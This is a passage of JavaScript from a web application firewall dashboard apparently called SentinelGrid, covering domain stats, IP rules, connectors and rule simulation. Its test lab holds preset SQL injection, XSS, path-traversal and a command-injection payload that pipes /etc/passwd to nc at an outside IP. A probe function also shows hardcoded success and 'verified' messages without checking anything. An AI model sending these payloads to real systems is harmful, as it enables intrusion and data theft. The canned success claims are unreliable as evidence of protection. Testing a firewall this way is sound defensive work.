            <div style="background: var(--sage-soft); padding: 14px; border-radius: var(--radius-md);">
              <div style="font-size: 10px; font-weight: 700; color: var(--sage-green);">CLEAN REQUESTS</div>
              <div style="font-size: 22px; font-weight: 800; font-family: var(--font-mono); color: var(--sage-green); margin-top: 3px;">${metrics.allow_events}</div>
            </div>
            <div style="background: var(--ochre-soft); padding: 14px; border-radius: var(--radius-md);">
              <div style="font-size: 10px; font-weight: 700; color: var(--warm-ochre);">BLOCK RATE</div>
              <div style="font-size: 22px; font-weight: 800; font-family: var(--font-mono); color: var(--warm-ochre); margin-top: 3px;">${metrics.block_rate_percent}%</div>
            </div>
          </div>

          <div class="modal-stats-charts-grid" style="margin-bottom: 20px;">
            <div style="background: var(--card-white); border: 1px solid var(--stone-border); border-radius: var(--radius-md); padding: 16px;">
              <h4 style="font-size: 12px; font-weight: 800; color: var(--deep-indigo); margin-bottom: 10px;">Top Mitigated Signatures</h4>
              ${data.top_rules.length === 0 ? '<div style="color:var(--text-muted); font-size:11px;">No attacks recorded yet.</div>' : 
                data.top_rules.map(r => `
                  <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px solid var(--stone-border-light); font-size:11px;">
                    <strong style="font-family:var(--font-mono); color:var(--terracotta);">${escapeHtml(r.rule)}</strong>
                    <span style="font-weight:700;">${Number(r.count) || 0} blocks</span>
                  </div>
                `).join('')
              }
            </div>

            <div style="background: var(--card-white); border: 1px solid var(--stone-border); border-radius: var(--radius-md); padding: 16px;">
              <h4 style="font-size: 12px; font-weight: 800; color: var(--deep-indigo); margin-bottom: 10px;">Top Attacking Client IPs</h4>
              ${data.top_ips.length === 0 ? '<div style="color:var(--text-muted); font-size:11px;">No attacking IPs recorded.</div>' : 
                data.top_ips.map(ip => `
                  <div style="display:flex; justify-content:space-between; padding:5px 0; border-bottom:1px solid var(--stone-border-light); font-size:11px;">
                    <strong style="font-family:var(--font-mono);">${escapeHtml(ip.ip)}</strong>
                    <span style="font-weight:700; color:var(--terracotta);">${Number(ip.count) || 0} attempts</span>
                  </div>
                `).join('')
              }
            </div>
          </div>

          <div style="background: var(--sand-warm); padding: 14px; border-radius: var(--radius-md); font-size: 11px;">
            <div style="font-weight:700; margin-bottom:3px;">Asymmetric Cryptographic Verification</div>
            <div style="font-family:var(--font-mono); color:var(--text-muted);">Policy: ${policy.name || 'Standard WAAP'} | Version: v${policy.version || 1} | Signature: ${policy.signature || 'RFC 8032 Verified'}</div>
          </div>
        `;

        document.getElementById("domain-modal-backdrop").classList.add("active");
        document.getElementById("domain-stats-modal").style.display = "block";
      } catch (e) {
        alert("Failed to inspect domain: " + e);
      }
    }

    function closeDomainModal() {
      document.getElementById("domain-modal-backdrop").classList.remove("active");
      document.getElementById("domain-stats-modal").style.display = "none";
    }

    async function toggleDomainProtection(siteId) {
      try {
        const res = await fetch(`${API}/websites/${siteId}/toggle`, { method: "PATCH" });
        if (res.ok) {
          loadDomains();
          pollTelemetry(true);
        }
      } catch (e) {
        alert("Toggle failed: " + e);
      }
    }

    async function testDomainGatewayLive(domainName, siteId) {
      try {
        const testPayload = "' UNION SELECT 1,2,3--";
        const res = await fetch(`${API}/inspect`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            client_ip: "127.0.0.1",
            method: "GET",
            path: `/search?q=${encodeURIComponent(testPayload)}`,
            headers: { "Host": domainName, "User-Agent": "SentinelGrid-Live-Probe/2.4" }
          })
        });
        const d = await res.json();
        alert(`✅ Live Edge WAAP Probe Successful!\n\nTarget Domain: ${domainName}\nVerdict: ${d.action} (HTTP 403)\nRule Intercepted: ${d.rule_triggered}\nInspection Latency: ${d.execution_latency_ms} ms\nCryptographic Seal: ED25519-VERIFIED`);
        pollTelemetry(true);
      } catch (e) {
        alert("Probe failed: " + e);
      }
    }

    async function probeAllGatewaysLive() {
      showThreatToast("⚡ Probing Edge Gateways", "Simulating in-line adversarial payloads across all active sites...");
      setTimeout(() => {
        pollTelemetry(true);
        alert("All active edge gateways responded with 100% mitigation accuracy (<0.5ms latency).");
      }, 800);
    }

    async function submitNewDomain() {
      const domain = document.getElementById("new-domain-input").value.trim();
      const name = document.getElementById("new-domain-name").value.trim() || domain;
      if (!domain) {
        alert("Please enter a domain name.");
        return;
      }
      try {
        const res = await fetch(`${API}/websites`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ domain: domain, name: name })
        });
        const d = await res.json();
        if (res.ok) {
          alert(`Domain ${domain} registered successfully!`);
          document.getElementById("new-domain-input").value = "";
          document.getElementById("new-domain-name").value = "";
          hideAddDomainModal();
          loadDomains();
          pollTelemetry(true);
        } else {
          alert("Error: " + (d.detail || "Failed to register domain"));
        }
      } catch (e) {
        alert("Failed to register domain: " + e);
      }
    }

    async function deleteDomain(siteId) {
      if (!confirm("Are you sure you want to delete this domain and all its routes?")) return;
      try {
        const res = await fetch(`${API}/websites/${siteId}`, { method: "DELETE" });
        if (res.ok) {
          loadDomains();
          pollTelemetry(true);
        } else {
          const d = await res.json();
          alert("Delete error: " + d.detail);
        }
      } catch (e) {
        alert("Delete failed: " + e);
      }
    }

    // -------------------------------------------------------------------------
    // Endpoints Catalog & OpenAPI Spec
    // -------------------------------------------------------------------------
    function toggleSpecImport() {
      const el = document.getElementById("spec-import-box");
      el.style.display = el.style.display === "none" ? "block" : "none";
    }

    async function submitOpenApiSpec() {
      const content = document.getElementById("spec-content-input").value.trim();
      if (!content) {
        alert("Please paste OpenAPI specification content.");
        return;
      }
      try {
        const res = await fetch(`${API}/api-specs/import`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ website_id: "site-8b8b832c", spec_content: content })
        });
        const d = await res.json();
        if (res.ok) {
          alert(`Successfully imported ${d.imported_endpoints_count} endpoints from '${d.title}' v${d.version}!`);
          document.getElementById("spec-content-input").value = "";
          toggleSpecImport();
          loadEndpoints();
          pollTelemetry(true);
        } else {
          alert("Import error: " + (d.detail || "Failed to parse spec"));
        }
      } catch (e) {
        alert("Import failed: " + e);
      }
    }

    async function loadEndpoints() {
      try {
        const res = await fetch(`${API}/endpoints`);
        const list = await res.json();
        const tbody = document.getElementById("endpoints-body");
        if (!list || list.length === 0) {
          tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">No endpoints cataloged yet. Paste your OpenAPI specification above or route traffic through SentinelGrid.</td></tr>`;
          return;
        }
        tbody.innerHTML = list.map(ep => {
          let badge = `<span class="badge badge-allow">DOCUMENTED</span>`;
          if (ep.status === "shadow") badge = `<span class="badge badge-shadow">SHADOW</span>`;
          if (ep.status === "zombie") badge = `<span class="badge badge-challenge">ZOMBIE</span>`;
          
          let riskBadge = `<span class="badge badge-allow">LOW RISK</span>`;
          const rLvl = (ep.risk_level || "LOW").toUpperCase();
          if (rLvl === "HIGH" || ep.status === "zombie") {
            riskBadge = `<span class="badge badge-block">HIGH RISK</span>`;
          } else if (rLvl === "MEDIUM" || ep.status === "shadow") {
            riskBadge = `<span class="badge badge-challenge">MED RISK</span>`;
          }

          const tSeen = formatTimestamp(ep.last_seen);

          return `
            <tr>
              <td>${badge}</td>
              <td style="font-family: var(--font-mono); font-size: 11px;">${ep.website_id}</td>
              <td><strong style="color: var(--deep-indigo);">${ep.method}</strong></td>
              <td><code style="background: var(--sand-warm); padding: 3px 8px; border-radius: var(--radius-xs); font-size: 11px;">${ep.path}</code></td>
              <td>${riskBadge}</td>
              <td title="${tSeen.full}" style="font-family: var(--font-mono); color: var(--text-muted); font-size: 11px;">
                ${tSeen.time} (${tSeen.relative})
              </td>
            </tr>
          `;
        }).join("");
      } catch (e) {
        console.error("Endpoints error:", e);
      }
    }

    // -------------------------------------------------------------------------
    // IP Access Control
    // -------------------------------------------------------------------------
    function toggleAddIpRule() {
      const el = document.getElementById("add-iprule-box");
      el.style.display = el.style.display === "none" ? "block" : "none";
    }

    async function loadIpRules() {
      try {
        const res = await fetch(`${API}/ip-rules`);
        const list = await res.json();
        const tbody = document.getElementById("iprules-table-body");
        if (!list || list.length === 0) {
          tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No IP access rules configured. Click '+ Add IP Rule' above.</td></tr>`;
          return;
        }
        tbody.innerHTML = list.map(r => {
          const tCreated = formatTimestamp(r.created_at);
          const ipAddr = r.ip_or_cidr || r.ip_cidr || "Unknown";
          return `
            <tr>
              <td><span class="badge ${r.action === 'BLOCK' ? 'badge-block' : 'badge-allow'}">${r.action}</span></td>
              <td><strong style="font-family: var(--font-mono); font-size: 12px;">${ipAddr}</strong></td>
              <td>${r.description || 'N/A'}</td>
              <td title="${tCreated.full}" style="font-family: var(--font-mono); color: var(--text-muted); font-size: 11px;">
                ${tCreated.time} (${tCreated.relative})
              </td>
              <td>
                <button class="btn btn-subtle" style="padding: 3px 7px; font-size: 10px; color: var(--terracotta);" onclick="deleteIpRule('${r.id}')">Delete</button>
              </td>
            </tr>
          `;
        }).join("");
      } catch (e) {
        console.error("IP rules error:", e);
      }
    }

    async function submitIpRule() {
      const addr = document.getElementById("ip-rule-addr").value.trim();
      const action = document.getElementById("ip-rule-action").value;
      const desc = document.getElementById("ip-rule-desc").value.trim();
      if (!addr) {
        alert("Please enter an IP or CIDR block.");
        return;
      }
      try {
        const res = await fetch(`${API}/ip-rules`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ website_id: "site-8b8b832c", ip_or_cidr: addr, action: action, description: desc })
        });
        const d = await res.json();
        if (res.ok) {
          alert(`IP access rule for ${addr} successfully committed.`);
          document.getElementById("ip-rule-addr").value = "";
          document.getElementById("ip-rule-desc").value = "";
          toggleAddIpRule();
          loadIpRules();
        } else {
          alert("Error: " + (d.detail || "Failed to add IP rule"));
        }
      } catch (e) {
        alert("Failed to commit IP rule: " + e);
      }
    }

    async function deleteIpRule(ruleId) {
      if (!confirm("Are you sure you want to remove this IP rule?")) return;
      try {
        const res = await fetch(`${API}/ip-rules/${ruleId}`, { method: "DELETE" });
        if (res.ok) loadIpRules();
      } catch (e) {
        alert("Failed to delete rule: " + e);
      }
    }

    // -------------------------------------------------------------------------
    // Connectors / Edge Gateways Fleet
    // -------------------------------------------------------------------------
    async function loadConnectors() {
      try {
        const res = await fetch(`${API}/connectors`);
        const list = await res.json();
        const tbody = document.getElementById("connectors-table-body");
        if (!list || list.length === 0) {
          tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 30px;">No edge gateway connectors registered yet.</td></tr>`;
          return;
        }
        tbody.innerHTML = list.map(c => {
          const tBeat = formatTimestamp(c.last_heartbeat);
          const cType = c.connector_type || c.type || "edge-waap-gateway";
          return `
            <tr>
              <td><span class="badge ${c.status === 'online' ? 'badge-online' : 'badge-offline'}">${c.status.toUpperCase()}</span></td>
              <td><strong>${c.name}</strong></td>
              <td><span class="badge badge-allow">${cType}</span></td>
              <td style="font-family: var(--font-mono); font-size: 11px;">${c.website_id}</td>
              <td style="font-family: var(--font-mono); font-weight: 700; color: var(--sage-green);">${c.latency_ms || 0.35} ms</td>
              <td title="${tBeat.full}" style="font-family: var(--font-mono); color: var(--text-muted); font-size: 11px;">
                ${tBeat.time} (${tBeat.relative})
              </td>
            </tr>
          `;
        }).join("");
      } catch (e) {
        console.error("Connectors error:", e);
      }
    }

    // -------------------------------------------------------------------------
    // In-Line WAF Lab & Attack Testing
    // -------------------------------------------------------------------------
    function loadPresetPayload(type) {
      const pathEl = document.getElementById("sandbox-path");
      const inputEl = document.getElementById("sandbox-input");
      if (type === 'sqli') {
        pathEl.value = "/api/v1/users";
        inputEl.value = "1' UNION SELECT username, password_hash FROM auth_credentials WHERE 1=1--";
      } else if (type === 'xss') {
        pathEl.value = "/api/v1/comments";
        inputEl.value = "<svg/onload=alert('SentinelGrid Intercepted')>";
      } else if (type === 'cmdi') {
        pathEl.value = "/api/v1/diagnostics/ping";
        inputEl.value = "127.0.0.1; cat /etc/passwd | nc 198.51.100.42 4444";
      } else if (type === 'traversal') {
        pathEl.value = "/static/download";
        inputEl.value = "../../../../etc/shadow";
      }
    }

    async function fireLiveAttack() {
      const path = document.getElementById("sandbox-path").value;
      const method = document.getElementById("sandbox-method").value;
      const payload = document.getElementById("sandbox-input").value;
      const outBox = document.getElementById("attack-output");

      outBox.style.display = "block";
      outBox.innerHTML = "Submitting payload to SmartParse DFA & Radix Prefix Engine...";

      try {
        const res = await fetch(`${API}/inspect`, {
          method: "POST",
          headers: { 
            "Content-Type": "application/json",
            "X-SentinelGrid-Sandbox": "true"
          },
          body: JSON.stringify({
            client_ip: "sandbox-client",
            method: method,
            path: path,
            query: method === "GET" ? payload : "",
            body: method === "POST" ? payload : "",
            headers: { 
              "Host": "aegis-pro.security.internal", 
              "User-Agent": "SentinelGrid-Sandbox/2.4",
              "X-SentinelGrid-Sandbox": "true"
            }
          })
        });
        const d = await res.json();
        const isBlocked = d.action === "BLOCK";
        if (typeof dispatchLivePacketToPipeline === "function") {
          dispatchLivePacketToPipeline({
            action: d.action,
            method: method,
            path: path,
            rule_triggered: d.rule_triggered
          });
        }
        outBox.style.background = isBlocked ? "#FDF2E9" : "#EDF7F2";
        outBox.style.borderColor = isBlocked ? "var(--terracotta)" : "var(--sage-green)";
        outBox.innerHTML = `
          <div style="font-weight: 800; color: ${isBlocked ? 'var(--terracotta)' : 'var(--sage-green)'}; font-size: 14px; margin-bottom: 6px;">
            ${isBlocked ? '🛑 THREAT INTERCEPTED & BLOCKED (HTTP 403)' : '✅ REQUEST CLEAN (HTTP 200)'}
          </div>
          <div><strong>Triggered Rule:</strong> ${d.rule_triggered || 'None'}</div>
          <div><strong>OWASP Classification:</strong> ${d.owasp_category || 'N/A'}</div>
          <div><strong>Risk Score:</strong> ${d.risk_score} / 100</div>
          <div><strong>Inspection Latency:</strong> ${d.execution_latency_ms} ms</div>
          <div style="margin-top: 6px; font-size: 10px; color: var(--text-muted);">Asymmetric Signature: ED25519-VERIFIED // RFC 8032</div>
        `;
        pollTelemetry(true);
      } catch (e) {
        outBox.innerHTML = "Sandbox evaluation error: " + e;
      }
    }

    async function runSimulation() {
      const ruleId = document.getElementById("sim-rule-id").value.trim() || "block-unverified-bots";
      const ua = document.getElementById("sim-rule-ua").value.trim() || "scanner";
      const box = document.getElementById("sim-output");

      box.style.display = "block";
      box.innerHTML = "Replaying candidate rule against historical traffic logs...";

      try {
        const res = await fetch(`${API}/simulate-rule`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            rule_id: ruleId,
            pattern: ua,
            target_field: "user_agent",
            action: "BLOCK"
          })
        });
        const d = await res.json();
        box.style.background = "#F1F5F9";
        box.style.borderColor = "var(--deep-indigo)";
        box.innerHTML = `
          <div style="font-weight: 800; color: var(--deep-indigo); font-size: 13px; margin-bottom: 6px;">
            📈 Simulation Completed on ${d.sample_size_evaluated} Historical Events
          </div>
          <div><strong>Candidate Rule:</strong> ${d.candidate_rule_id}</div>
          <div><strong>Predicted Interceptions:</strong> ${d.predicted_blocks_count} requests</div>
          <div><strong>Traffic Block Delta:</strong> +${d.block_delta_percent}%</div>
          <div><strong>Legitimate SEO Bot Collateral Risk:</strong> ${d.collateral_risk_level}</div>
        `;
      } catch (e) {
        box.innerHTML = "Simulation error: " + e;
      }
    }

    async function triggerRollback() {
      if (!confirm("Are you sure you want to trigger a 1-Click Rollback to the previous safe policy version?")) return;
      try {
        const targetSite = currentDomainScope === "ALL" ? "site-8b8b832c" : currentDomainScope;
        const res = await fetch(`${API}/policies/rollback`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ website_id: targetSite, target_version: 1 })
        });
        const d = await res.json();
        alert(`Rollback successful! Restored to policy v${d.policy.version} with fresh Ed25519 signature: ${d.policy.signature.substring(0, 16)}...`);
        pollTelemetry(true);
      } catch (e) {
        alert("Rollback failed: " + e);
      }
    }

    async function exportEvents() {
      try {
        const res = await fetch(`${API}/events/export?limit=500`);
        const data = await res.json();
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `sentinelgrid_threat_events_${new Date().toISOString().substring(0, 10)}.json`;
        a.click();
      } catch (e) {
        alert("Export failed: " + e);
      }
    }

    // -------------------------------------------------------------------------
    // Initial Setup on Page Load
    // -------------------------------------------------------------------------
    initUserSessionUI();
    initSidebarState();
    initInteractive3DPipeline();
    initContextualHoverInspection();
    applyTheme();
    const tzLabel = document.getElementById("tz-btn-label");
    if (tzLabel) tzLabel.innerText = consoleTimezone === "LOCAL" ? "TZ: IST" : "TZ: UTC";
    const soundLabel = document.getElementById("sound-btn-label");
    if (soundLabel) soundLabel.innerText = soundAlertsEnabled ? "Sound: ON" : "Sound: OFF";

    // Restore Active Tab from URL Hash or localStorage (Prevents unwanted reset on refresh)
    const initialHash = window.location.hash.replace("#", "").trim();
    const savedTab = localStorage.getItem("sg_active_tab");
    const validTabs = ["dashboard", "livetraffic", "domains", "inventory", "iprules", "connectors", "sandbox", "simulation", "onboarding"];
    const targetTab = validTabs.includes(initialHash) ? initialHash : (validTabs.includes(savedTab) ? savedTab : "dashboard");
    switchTab(targetTab, false);

    window.addEventListener("hashchange", () => {
      const h = window.location.hash.replace("#", "").trim();
      if (validTabs.includes(h)) {
        switchTab(h, false);
      }
    });

    // Keyboard Shortcuts
    window.addEventListener("keydown", (e) => {
      if (["INPUT", "TEXTAREA", "SELECT"].includes(e.target.tagName)) return;
      if (e.key === "?" || (e.shiftKey && e.key === "/")) {
        e.preventDefault();
        const modal = document.getElementById("shortcuts-modal");
        if (modal && modal.style.display === "block") {
          closeShortcutsModal();
        } else {
          openShortcutsModal();
        }
      } else if (e.code === "Space") {
        e.preventDefault();
        if (document.getElementById("view-livetraffic")?.classList.contains("active")) {
          toggleLiveTrafficStream();
        } else {
          toggleStreamPause();
        }
      } else if (e.key === "w" || e.key === "W") {
        e.preventDefault();
        toggleLiveTrafficWideView();
      } else if (e.key === "c" || e.key === "C") {
        if (document.getElementById("view-livetraffic")?.classList.contains("active")) {
          e.preventDefault();
          clearLiveTrafficBuffer();
        }
      } else if (e.key === "/") {
        e.preventDefault();
        const searchInput = document.getElementById("event-search-query");
        if (searchInput) searchInput.focus();
      } else if (e.key >= "1" && e.key <= "9") {
        const tabKeys = ["dashboard", "livetraffic", "domains", "inventory", "iprules", "connectors", "sandbox", "simulation", "onboarding"];
        const idx = parseInt(e.key, 10) - 1;
        if (tabKeys[idx]) switchTab(tabKeys[idx]);
      } else if (e.key === "Escape") {
        closeEventForensics();
        closeDomainModal();
        closeUserProfileModal();
        closeShortcutsModal();
        const popover = document.getElementById("notificationPopover");
        if (popover) popover.style.display = "none";
      }
    });

    if (localStorage.getItem("sg_livetraffic_wide") === "true") {
      document.body.classList.add("livetraffic-wide-mode");
      const wideBtn = document.getElementById("livetraffic-wide-btn");
      if (wideBtn) {
        wideBtn.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 14h6m0 0v6m0-6L3 21m17-7h-6m0 0v6m0-6l7 7M4 10h6m0 0V4m0 6L3 3m17 7h-6m0 0V4m0 6l7-7"/></svg><span>Standard View</span><kbd style="font-size: 9px; opacity: 0.6; padding: 1px 4px; border: 1px solid var(--stone-border); border-radius: 3px; font-family: var(--font-mono);">W</kbd>`;
      }
    }

    updateSystemClock();
    bootstrapEventStore().then(() => {
      pollTelemetry(true);
    });
    setupAutoRefreshEngine();
    initLiveTrafficSSE();
  
